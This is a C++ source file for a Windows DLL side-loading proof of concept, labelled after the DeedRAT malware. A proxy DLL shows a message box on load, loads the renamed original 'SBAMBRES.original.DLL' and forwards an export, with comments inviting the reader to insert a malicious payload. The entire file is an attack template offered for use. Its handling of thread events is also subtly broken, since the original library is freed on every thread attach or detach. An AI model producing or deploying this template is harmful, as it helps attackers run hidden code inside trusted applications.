#include <Windows.h>

// Function pointer for the original DLL's export
typedef void (*OriginalExportFunc)(void);

HMODULE hOriginalDll = NULL;
OriginalExportFunc pOriginalFunc = NULL;

// Define your exported functions and forward them
// Example for a function named "SomeExportedFunction"
extern "C" __declspec(dllexport) void SomeExportedFunction() {
    if (pOriginalFunc) {
        pOriginalFunc(); // Call the original function
    }
    // Add your malicious payload here if desired
}

BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD  ul_reason_for_call,
                      LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // Your malicious payload
        MessageBoxA(NULL, "DeedRAT PoC: Malicious DLL Loaded!", "DLL Side-Loading Success", MB_OK);

        // Load the original DLL (rename it first, e.g., to SBAMBRES.original.DLL)
        hOriginalDll = LoadLibraryA("SBAMBRES.original.DLL");
        if (hOriginalDll) {
            pOriginalFunc = (OriginalExportFunc)GetProcAddress(hOriginalDll, "SomeExportedFunction");
            // ... get addresses for all other exported functions
        }
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        if (hOriginalDll) {
            FreeLibrary(hOriginalDll);
        }
        break;
    }
    return TRUE;
}
